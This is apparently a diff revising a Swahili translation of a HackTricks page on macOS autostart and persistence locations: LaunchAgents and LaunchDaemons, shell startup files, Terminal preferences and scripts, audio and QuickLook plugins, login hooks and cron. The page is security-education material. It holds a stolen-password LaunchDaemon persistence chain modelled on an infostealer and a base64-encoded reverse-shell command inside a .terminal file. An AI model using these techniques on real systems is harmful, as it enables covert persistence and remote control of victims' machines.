@@ -2,54 +2,54 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-Sehemu hii inategemea kwa kiasi kikubwa mfululizo wa blogu [**Beyond the good ol. LaunchAgents**](https://theevilbit.github.io/beyond/), lengo likiwa kuongeza **Autostart Locations** zaidi (ikiwezekana), kuonyesha **ni techniques zipi bado zinafanya kazi** siku hizi katika toleo jipya zaidi la macOS (13.4), na kubainisha **permissions** zinazohitajika.
+Sehemu hii inategemea kwa kiasi kikubwa mfululizo wa blogu [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), lengo likiwa kuongeza **Autostart Locations** zaidi (ikiwezekana), kuonyesha **ni mbinu zipi bado zinafanya kazi** siku hizi katika toleo jipya zaidi la macOS (13.4), na kubainisha **permissions** zinazohitajika.
 
 ## Sandbox Bypass
 
 > [!TIP]
-> Hapa unaweza kupata maeneo ya kuanzisha yanayofaa kwa **sandbox bypass**, yanayokuruhusu kutekeleza kitu kwa urahisi kwa **kukiandika kwenye faili** na **kusubiri** **action** ya kawaida sana, **muda maalum** au **action unayoweza kwa kawaida kufanya** ukiwa ndani ya sandbox bila kuhitaji root permissions.
+> Hapa unaweza kupata start locations zinazofaa kwa **sandbox bypass**, zinazokuruhusu kutekeleza kitu kwa urahisi kwa **kukiandika kwenye file** na **kusubiri** **action** ya **kawaida sana**, **muda uliowekwa** au **action unayoweza kwa kawaida kutekeleza** ukiwa ndani ya sandbox bila kuhitaji root permissions.
 
 ### Launchd
 
-- Inafaa kwa sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
+- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
 - TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Locations
 
 - **`/Library/LaunchAgents`**
 - **Trigger**: Reboot
-- Root inahitajika
+- Root required
 - **`/Library/LaunchDaemons`**
 - **Trigger**: Reboot
-- Root inahitajika
+- Root required
 - **`/System/Library/LaunchAgents`**
 - **Trigger**: Reboot
-- Root inahitajika
+- Root required
 - **`/System/Library/LaunchDaemons`**
 - **Trigger**: Reboot
-- Root inahitajika
+- Root required
 - **`~/Library/LaunchAgents`**
 - **Trigger**: Relog-in
 - **`~/Library/LaunchDemons`**
 - **Trigger**: Relog-in
 
 > [!TIP]
-> Kama jambo la kuvutia, **`launchd`** ina property list iliyopachikwa katika sehemu ya Mach-o `__Text.__config`, ambayo ina services nyingine zinazojulikana ambazo launchd lazima ianzishe. Zaidi ya hayo, services hizi zinaweza kuwa na `RequireSuccess`, `RequireRun` na `RebootOnSuccess`, kumaanisha kwamba lazima ziendeshwe na zikamilike kwa mafanikio.
+> Kama jambo la kuvutia, **`launchd`** ina property list iliyopachikwa katika sehemu ya Mach-o `__Text.__config`, ambayo ina services nyingine zinazojulikana ambazo launchd lazima ianzishe. Zaidi ya hayo, services hizi zinaweza kuwa na `RequireSuccess`, `RequireRun` na `RebootOnSuccess`, ikimaanisha kwamba lazima ziendeshwe na zikamilike kwa mafanikio.
 >
 > Bila shaka, haiwezi kurekebishwa kwa sababu ya code signing.
 
-#### Maelezo na Exploitation
+#### Description & Exploitation
 
-**`launchd`** ndiyo **process** ya kwanza kutekelezwa na kernel ya OX S wakati wa kuanza na ya mwisho kumaliza wakati wa kuzima. Inapaswa daima kuwa na **PID 1**. Process hii **itasoma na kutekeleza** configurations zilizoonyeshwa katika **ASEP** **plists** zilizopo kwenye:
+**`launchd`** ni **process** ya kwanza inayotekelezwa na kernel ya macOS wakati wa kuanza na ya mwisho kumaliza wakati wa kuzima. Inapaswa kuwa na **PID 1** kila wakati. Process hii **itasoma na kutekeleza** configurations zilizoonyeshwa katika **ASEP** **plists** zilizopo kwenye:
 
-- `/Library/LaunchAgents`: Per-user agents zilizosakinishwa na admin
-- `/Library/LaunchDaemons`: System-wide daemons zilizosakinishwa na admin
-- `/System/Library/LaunchAgents`: Per-user agents zinazotolewa na Apple.
-- `/System/Library/LaunchDaemons`: System-wide daemons zinazotolewa na Apple.
+- `/Library/LaunchAgents`: Per-user agents zilizowekwa na admin
+- `/Library/LaunchDaemons`: System-wide daemons zilizowekwa na admin
+- `/System/Library/LaunchAgents`: Per-user agents zilizotolewa na Apple.
+- `/System/Library/LaunchDaemons`: System-wide daemons zilizotolewa na Apple.
 
-Mtumiaji anapoingia, plists zilizopo kwenye `/Users/$USER/Library/LaunchAgents` na `/Users/$USER/Library/LaunchDemons` huanzishwa kwa **permissions za mtumiaji aliyeingia**.
+Mtumiaji anapoingia, plists zilizopo katika `/Users/$USER/Library/LaunchAgents` na `/Users/$USER/Library/LaunchDemons` huanzishwa kwa kutumia **permissions za mtumiaji aliyeingia**.
 
-**Tofauti kuu kati ya agents na daemons ni kwamba agents hupakiwa mtumiaji anapoingia, na daemons hupakiwa wakati wa kuanza kwa mfumo** (kwa kuwa kuna services kama ssh zinazohitaji kutekelezwa kabla mtumiaji yeyote hajafikia mfumo). Pia agents zinaweza kutumia GUI, huku daemons zikihitaji kuendeshwa chinichini.
+**Tofauti kuu kati ya agents na daemons ni kwamba agents hupakiwa mtumiaji anapoingia na daemons hupakiwa wakati wa kuanza kwa mfumo** (kwa kuwa kuna services kama ssh zinazohitaji kutekelezwa kabla mtumiaji yeyote hajafikia mfumo). Pia agents zinaweza kutumia GUI, ilhali daemons zinahitaji kuendeshwa chinichini.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
@@ -72,25 +72,25 @@ Mtumiaji anapoingia, plists zilizopo kwenye `/Users/$USER/Library/LaunchAgents` 
 </dict>
 </plist>
 ```
-Kuna hali ambapo **agent inahitaji kutekelezwa kabla ya user kuingia**, hizi huitwa **PreLoginAgents**. Kwa mfano, hii ni muhimu ili kutoa teknolojia saidizi wakati wa kuingia. Pia zinaweza kupatikana katika `/Library/LaunchAgents` (tazama [**hapa**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) kwa mfano).
+Kuna hali ambapo **agent inahitaji kutekelezwa kabla ya user kuingia**, hizi huitwa **PreLoginAgents**. Kwa mfano, hii ni muhimu kwa kutoa teknolojia saidizi wakati wa login. Pia zinaweza kupatikana katika `/Library/LaunchAgents`(tazama [**hapa**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) kwa mfano).
 
 > [!TIP]
-> Faili mpya za usanidi wa Daemons au Agents **zitapakiwa baada ya kuwasha upya au kwa kutumia** `launchctl load <target.plist>` Pia **inawezekana kupakia faili za .plist zisizo na kiendelezi hicho** kwa kutumia `launchctl -F <file>` (hata hivyo, faili hizo za plist hazitapakiwa kiotomatiki baada ya kuwasha upya).\
-> Pia inawezekana **kuondoa upakiaji** kwa kutumia `launchctl unload <target.plist>` (process iliyoelekezwa na faili hiyo itasitishwa),
+> Faili mpya za usanidi wa Daemons au Agents **zitapakiwa baada ya reboot inayofuata au kwa kutumia** `launchctl load <target.plist>` Pia **inawezekana kupakia faili za .plist bila extension hiyo** kwa kutumia `launchctl -F <file>` (hata hivyo faili hizo za plist hazitapakiwa kiotomatiki baada ya reboot).\
+> Pia inawezekana **ku-unload** kwa kutumia `launchctl unload <target.plist>` (process iliyoelekezwa nayo itasitishwa),
 >
-> Ili **kuhakikisha** kwamba hakuna **kitu chochote** (kama override) **kinachozuia** **Agent** au **Daemon** **kutekelezwa**, endesha: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
+> Ili **kuhakikisha** kwamba hakuna **kitu chochote** (kama override) **kinachozuia** **Agent** au **Daemon** **ku-run**, tumia: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
 
 Orodhesha agents na daemons zote zilizopakiwa na user wa sasa:
 ```bash
 launchctl list
 ```
-#### Mfano wa malicious LaunchDaemon chain (password reuse)
+#### Mfano wa mnyororo hasidi wa LaunchDaemon (kutumia tena password)
 
-macOS infostealer ya hivi karibuni ilitumia tena **captured sudo password** kuweka user agent na root LaunchDaemon:<sup>[[1]](#references)</sup>
+Infostealer ya hivi karibuni ya macOS ilitumia tena **password ya sudo iliyonaswa** kuweka user agent na LaunchDaemon ya root:<sup>[[1]](#references)</sup>
 
 - Andika agent loop kwenye `~/.agent` na uifanye iwe executable.
-- Generate plist kwenye `/tmp/starter` inayoelekeza kwenye agent hiyo.
-- Tumia tena stolen password na `sudo -S` kuinakili hadi `/Library/LaunchDaemons/com.finder.helper.plist`, weka `root:wheel`, kisha ipakie kwa `launchctl load`.
+- Tengeneza plist kwenye `/tmp/starter` inayoelekeza kwenye agent hiyo.
+- Tumia tena password iliyoibiwa na `sudo -S` kuinakili hadi `/Library/LaunchDaemons/com.finder.helper.plist`, weka `root:wheel`, kisha ipakie kwa `launchctl load`.
 - Anzisha agent kimya kupitia `nohup ~/.agent >/dev/null 2>&1 &` ili kutenganisha output.
 ```bash
 printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
@@ -99,40 +99,40 @@ printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.h
 nohup "$HOME/.agent" >/dev/null 2>&1 &
 ```
 > [!WARNING]
-> Ikiwa plist inamilikiwa na mtumiaji, hata ikiwa iko kwenye mafolda ya daemon ya mfumo mzima, **task itatekelezwa kama mtumiaji** na si kama root. Hili linaweza kuzuia baadhi ya mashambulizi ya privilege escalation.
+> Ikiwa plist inamilikiwa na user, hata ikiwa iko kwenye system wide folders za daemon, **task itatekelezwa kama user** na si kama root. Hii inaweza kuzuia baadhi ya mashambulizi ya privilege escalation.
 
 #### Maelezo zaidi kuhusu launchd
 
-**`launchd`** ni mchakato wa kwanza wa **user mode** unaoanzishwa kutoka kwenye **kernel**. Uanzishaji wa mchakato lazima **ufaulu** na mchakato huo **hauwezi kutoka au ku-crash**. Pia **umelindwa** dhidi ya baadhi ya **killing signals**.
+**`launchd`** ni mchakato wa kwanza wa **user mode** unaoanzishwa kutoka kwa **kernel**. Uanzishaji wa mchakato lazima **ufanikiwe** na mchakato huo **hauwezi kutoka au ku-crash**. Pia **umelindwa** dhidi ya baadhi ya **killing signals**.
 
-Mojawapo ya mambo ya kwanza ambayo `launchd` hufanya ni **kuanzisha** **daemons** wote kama vile:
+Moja ya mambo ya kwanza ambayo `launchd` hufanya ni **kuanzisha** **daemons** zote kama vile:
 
 - **Timer daemons** kulingana na muda wa kutekelezwa:
 - atd (`com.apple.atrun.plist`): Ina `StartInterval` ya dakika 30
 - crond (`com.apple.systemstats.daily.plist`): Ina `StartCalendarInterval` ya kuanza saa 00:15
 - **Network daemons** kama:
-- `org.cups.cups-lpd`: Husikiliza TCP (`SockType: stream`) kwa `SockServiceName: printer`
+- `org.cups.cups-lpd`: Inasikiliza TCP (`SockType: stream`) kwa `SockServiceName: printer`
 - SockServiceName lazima iwe port au service kutoka `/etc/services`
-- `com.apple.xscertd.plist`: Husikiliza TCP kwenye port 1640
-- **Path daemons** zinazotekelezwa path iliyobainishwa inapobadilika:
-- `com.apple.postfix.master`: Hukagua path `/etc/postfix/aliases`
+- `com.apple.xscertd.plist`: Inasikiliza TCP kwenye port 1640
+- **Path daemons** zinazotekelezwa wakati path iliyoainishwa inabadilika:
+- `com.apple.postfix.master`: Inakagua path `/etc/postfix/aliases`
 - **IOKit notifications daemons**:
 - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
 - **Mach port:**
-- `com.apple.xscertd-helper.plist`: Inaonyesha kwenye entry ya `MachServices` jina `com.apple.xscertd.helper`
+- `com.apple.xscertd-helper.plist`: Inaonyesha jina `com.apple.xscertd.helper` kwenye entry ya `MachServices`
 - **UserEventAgent:**
-- Hii ni tofauti na ya awali. Hufanya launchd i-spawn apps ikijibu event maalum. Hata hivyo, katika hali hii, binary kuu inayohusika si `launchd` bali `/usr/libexec/UserEventAgent`. Hupakia plugins kutoka kwenye folder iliyozuiwa na SIP `/System/Library/UserEventPlugins/`, ambapo kila plugin huonyesha initialiser yake kwenye key ya `XPCEventModuleInitializer` au, kwa plugins za zamani, kwenye dict ya `CFPluginFactories` chini ya key `FB86416D-6164-2070-726F-70735C216EC0` ya `Info.plist` yake.
+- Hii ni tofauti na ya awali. Hufanya launchd spawn apps kulingana na event maalum. Hata hivyo, katika hali hii, binary kuu inayohusika si `launchd` bali `/usr/libexec/UserEventAgent`. Inapakia plugins kutoka kwenye folder iliyozuiliwa na SIP `/System/Library/UserEventPlugins/`, ambapo kila plugin huonyesha initialiser yake kwenye key ya `XPCEventModuleInitializer` au, kwa plugins za zamani, kwenye dict ya `CFPluginFactories` chini ya key `FB86416D-6164-2070-726F-70735C216EC0` ya `Info.plist` yake.
 
-### mafaili ya kuanzisha shell
+### faili za kuanzisha shell
 
-Maelezo: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
-Maelezo (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>
+Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
+Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>
 
-- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Inasaidia kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
 - TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
-- Lakini unahitaji kupata app yenye TCC bypass inayotekeleza shell inayopakia mafaili haya
+- Lakini unahitaji kupata app yenye TCC bypass ambayo hu-execute shell inayopakia faili hizi
 
-#### Mahali
+#### Locations
 
 - **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
 - **Trigger**: Fungua terminal yenye zsh
@@ -150,37 +150,37 @@ Maelezo (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://thee
 - `/etc/profile` (haikufanya kazi)
 - `~/.profile` (haikufanya kazi)
 - `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
-- **Trigger**: Inatarajiwa ku-trigger na xterm, lakini **haijasakinishwa**, na hata baada ya kusakinishwa error hii hutokea: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>
+- **Trigger**: Ilitarajiwa ku-trigger na xterm, lakini **haijawekwa**, na hata baada ya kuiweka error hii hutokea: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>
 
 #### Maelezo na Exploitation
 
-Wakati wa kuanzisha mazingira ya shell kama `zsh` au `bash`, **mafaili fulani ya kuanzisha huendeshwa**. Kwa sasa macOS hutumia `/bin/zsh` kama shell ya default. Shell hii hufikiwa kiotomatiki programu ya Terminal inapozinduliwa au kifaa kinapofikiwa kupitia SSH. Ingawa `bash` na `sh` pia zipo kwenye macOS, zinahitaji kuitishwa wazi ili zitumike.<sup>[[2]](#references)</sup>
+Wakati wa kuanzisha mazingira ya shell kama `zsh` au `bash`, **faili fulani za kuanzisha huendeshwa**. Kwa sasa macOS hutumia `/bin/zsh` kama shell ya default. Shell hii hufikiwa automatically wakati application ya Terminal inapoanzishwa au wakati kifaa kinapofikiwa kupitia SSH. Ingawa `bash` na `sh` pia zipo kwenye macOS, lazima ziitwe explicitly ili zitumike.<sup>[[2]](#references)</sup>
 
-Ukurasa wa man wa zsh, ambao tunaweza kuusoma kwa **`man zsh`**, una maelezo marefu kuhusu mafaili ya kuanzisha.
+Ukurasa wa man wa zsh, ambao tunaweza kuusoma kwa kutumia **`man zsh`**, una maelezo marefu kuhusu faili za kuanzisha.
 ```bash
 # Example executino via ~/.zshrc
 echo "touch /tmp/hacktricks" >> ~/.zshrc
 ```
-### Programu Zilizofunguliwa Tena
+### Applications Zilizofunguliwa Tena
 
 > [!CAUTION]
-> Kuweka exploitation iliyoonyeshwa na kutoka kisha kuingia tena, au hata kuwasha upya, hakukuendesha app katika majaribio. Huenda app inahitaji kuwa inaendeshwa wakati vitendo hivi vinapofanywa.
+> Kusanidi exploitation iliyoonyeshwa na kutoka kisha kuingia tena, au hata kuwasha upya, hakukusababisha app kutekelezwa wakati wa testing. Huenda app inahitaji kuwa inaendeshwa wakati hatua hizi zinafanywa.
 
-**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>
+**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>
 
-- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Mahali
 
 - **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
-- **Kichochezi**: Kuanzisha upya hufungua tena applications
+- **Trigger**: Kufungua tena applications baada ya restart
 
 #### Maelezo na Exploitation
 
 Applications zote za kufunguliwa tena ziko ndani ya plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>
 
-Kwa hiyo, ili kufanya applications za kufunguliwa tena zianzishe app yako, unahitaji tu **kuongeza app yako kwenye orodha**.
+Kwa hivyo, ili applications za kufunguliwa tena zianzishe yako mwenyewe, unahitaji tu **kuongeza app yako kwenye list**.
 
 UUID inaweza kupatikana kwa kuorodhesha directory hiyo au kwa kutumia `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`
 
@@ -200,28 +200,28 @@ Ili **kuongeza programu kwenye orodha hii** unaweza kutumia:
 -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
 ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
-### Terminal Preferences
+### Mapendeleo ya Terminal
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>
 
-- Muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- Terminal hutumia kuwa na ruhusa za FDA za mtumiaji anayeitumia
+- Terminal ilikuwa na ruhusa za FDA za mtumiaji aliyeitumia
 
 #### Mahali
 
 - **`~/Library/Preferences/com.apple.Terminal.plist`**
-- **Trigger**: Fungua Terminal
+- **Trigger**: Kufungua Terminal
 
 #### Maelezo na Exploitation
 
-Katika **`~/Library/Preferences`** huhifadhiwa mapendeleo ya mtumiaji katika Applications. Baadhi ya mapendeleo haya yanaweza kuwa na configuration ya **execute applications/scripts** nyingine.<sup>[[5]](#references)</sup>
+Ndani ya **`~/Library/Preferences`** huhifadhiwa mapendeleo ya mtumiaji katika Applications. Baadhi ya mapendeleo haya yanaweza kuhifadhi configuration ya **execute applications/scripts nyingine**.<sup>[[5]](#references)</sup>
 
 Kwa mfano, Terminal inaweza execute command wakati wa Startup:
 
 <figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>
 
-Configuration hii inaonyeshwa katika file **`~/Library/Preferences/com.apple.Terminal.plist`** kama ifuatavyo:
+Config hii inaakisiwa katika file **`~/Library/Preferences/com.apple.Terminal.plist`** kama ifuatavyo:
 ```bash
 [...]
 "Window Settings" => {
@@ -237,9 +237,9 @@ Configuration hii inaonyeshwa katika file **`~/Library/Preferences/com.apple.Ter
 }
 [...]
 ```
-Kwa hivyo, ikiwa plist ya mapendeleo ya terminal kwenye system inaweza kuandikwa upya, utendaji wa **`open`** unaweza kutumika **kufungua terminal na amri hiyo itatekelezwa**.
+Kwa hivyo, ikiwa plist ya mapendeleo ya terminal kwenye mfumo inaweza kuandikwa upya, basi utendaji wa **`open`** unaweza kutumika **kufungua terminal, na amri hiyo itatekelezwa**.
 
-Unaweza kuongeza hii kutoka kwenye CLI kwa:
+Unaweza kuongeza hili kutoka kwa cli kwa:
 ```bash
 # Add
 /usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
@@ -248,11 +248,11 @@ Unaweza kuongeza hii kutoka kwenye CLI kwa:
 # Remove
 /usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
 ```
-### Terminal Scripts / Other file extensions
+### Terminal Scripts / Viendelezi vingine vya faili
 
 - Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- Kutumia Terminal ili kupata ruhusa za FDA za mtumiaji anayeitumia
+- Terminal hutumia permissions za FDA za mtumiaji anayeitumia
 
 #### Location
 
@@ -261,7 +261,7 @@ Unaweza kuongeza hii kutoka kwenye CLI kwa:
 
 #### Description & Exploitation
 
-Ukiunda script ya [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) na kuifungua, **Terminal application** itafunguliwa kiotomatiki ili kutekeleza commands zilizoainishwa ndani yake. Ikiwa Terminal app ina privileges maalum (kama vile TCC), command yako itaendeshwa kwa privileges hizo maalum.
+Ukiunda [**`.terminal` script**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) na kuifungua, **Terminal application** itafunguliwa automatically ili kutekeleza commands zilizoonyeshwa humo. Ikiwa Terminal app ina privileges maalum (kama vile TCC), command yako itaendeshwa ikiwa na privileges hizo maalum.
 
 Ijaribu kwa:
 ```bash
@@ -291,45 +291,45 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
-Unaweza pia kutumia viendelezi **`.command`**, **`.tool`**, vyenye maudhui ya kawaida ya shell scripts, na pia vitafunguliwa na Terminal.
+Unaweza pia kutumia extensions **`.command`**, **`.tool`**, zikiwa na maudhui ya regular shell scripts, na pia zitafunguliwa na Terminal.
 
 > [!CAUTION]
 > Ikiwa Terminal ina **Full Disk Access**, itaweza kukamilisha kitendo hicho (kumbuka kwamba command iliyotekelezwa itaonekana kwenye dirisha la terminal).
 
 ### Audio Plugins
 
-Maelezo: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
-Maelezo: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>
+Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
+Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>
 
-- Yanafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Inafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
-- Huenda ukapata ufikiaji wa ziada wa TCC
+- Unaweza kupata TCC access ya ziada
 
 #### Mahali
 
 - **`/Library/Audio/Plug-Ins/HAL`**
 - Root inahitajika
-- **Trigger**: Anzisha upya coreaudiod au computer
+- **Trigger**: Restart coreaudiod au computer
 - **`/Library/Audio/Plug-ins/Components`**
 - Root inahitajika
-- **Trigger**: Anzisha upya coreaudiod au computer
+- **Trigger**: Restart coreaudiod au computer
 - **`~/Library/Audio/Plug-ins/Components`**
-- **Trigger**: Anzisha upya coreaudiod au computer
+- **Trigger**: Restart coreaudiod au computer
 - **`/System/Library/Components`**
 - Root inahitajika
-- **Trigger**: Anzisha upya coreaudiod au computer
+- **Trigger**: Restart coreaudiod au computer
 
 #### Maelezo
 
-Kulingana na maelezo ya awali, inawezekana **kucompile baadhi ya audio plugins** na kuzifanya zipakiwe.<sup>[[6]](#references)[[7]](#references)</sup>
+Kulingana na writeups zilizotangulia, inawezekana **compile baadhi ya audio plugins** na kuzifanya zipakwe.<sup>[[6]](#references)[[7]](#references)</sup>
 
 ### QuickLook Plugins
 
-Maelezo: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>
+Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>
 
-- Yanafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Inafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
-- Huenda ukapata ufikiaji wa ziada wa TCC
+- Unaweza kupata TCC access ya ziada
 
 #### Mahali
 
@@ -341,26 +341,26 @@ Maelezo: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.g
 
 #### Maelezo na Exploitation
 
-QuickLook plugins zinaweza kutekelezwa unapofanya **preview ya file** (bonyeza space bar huku file likiwa limechaguliwa kwenye Finder) na **plugin inayotumia aina hiyo ya file** ikiwa imesakinishwa.<sup>[[8]](#references)</sup>
+QuickLook plugins zinaweza kutekelezwa unapofanya **preview ya file** (bonyeza space bar wakati file limechaguliwa katika Finder) na **plugin inayounga mkono aina hiyo ya file** ikiwa imewekwa.<sup>[[8]](#references)</sup>
 
-Inawezekana kucompile QuickLook plugin yako mwenyewe, kuiweka katika mojawapo ya maeneo yaliyotajwa hapo awali ili ipakiwe, kisha uende kwenye file linalotumika na ubonyeze space ili kui-trigger.
+Inawezekana ku-compile QuickLook plugin yako mwenyewe, kuiweka katika mojawapo ya locations zilizotajwa hapo awali ili ipakwe, kisha uende kwenye file linaloungwa mkono na ubonyeze space ili kui-trigger.
 
 ### ~~Login/Logout Hooks~~
 
 > [!CAUTION]
-> Hili halikufanya kazi kwangu, si kwa user LoginHook wala kwa root LogoutHook
+> Hii haikufanya kazi kwangu, si kwa user LoginHook wala kwa root LogoutHook
 
-**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>
+**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>
 
-- Yanafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Inafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Mahali
 
 - Unahitaji kuwa na uwezo wa kutekeleza kitu kama `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
-- Iko katika `~/Library/Preferences/com.apple.loginwindow.plist`
+- Imewekwa katika `~/Library/Preferences/com.apple.loginwindow.plist`
 
-Zimepitwa na wakati, lakini zinaweza kutumika kutekeleza commands user anapoingia.<sup>[[9]](#references)</sup>
+Zime-deprecate lakini zinaweza kutumika kutekeleza commands user anapo-login.<sup>[[9]](#references)</sup>
 ```bash
 cat > $HOME/hook.sh << EOF
 #!/bin/bash
@@ -370,7 +370,7 @@ chmod +x $HOME/hook.sh
 defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
 defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
 ```
-Mpangilio huu huhifadhiwa katika `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
+Mpangilio huu umehifadhiwa katika `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
 ```bash
 defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
 {
@@ -387,44 +387,44 @@ Ili kuifuta:
 defaults delete com.apple.loginwindow LoginHook
 defaults delete com.apple.loginwindow LogoutHook
 ```
-Mtumiaji root huhifadhiwa katika **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**
+Ya mtumiaji wa root imehifadhiwa katika **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**
 
 ## Conditional Sandbox Bypass
 
 > [!TIP]
-> Hapa unaweza kupata maeneo ya kuanzisha yanayofaa kwa **sandbox bypass**, yanayokuruhusu kutekeleza kitu kwa urahisi kwa **kukiiandika kwenye faili** na **kutegemea hali zisizo za kawaida sana**, kama vile **programu maalum zilizowekwa, vitendo vya mtumiaji "visivyo vya kawaida"** au mazingira.
+> Hapa unaweza kupata maeneo ya kuanzisha yanayofaa kwa **sandbox bypass** ambayo hukuruhusu kutekeleza kitu kwa urahisi kwa **kukiiandika kwenye faili** na **kutegemea hali zisizo za kawaida sana** kama **programu maalum zilizowekwa, vitendo vya mtumiaji "visivyo vya kawaida"** au mazingira.
 
 ### Cron
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>
+**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>
 
 - Inafaa kwa sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
-- Hata hivyo, lazima uweze kutekeleza `crontab` binary
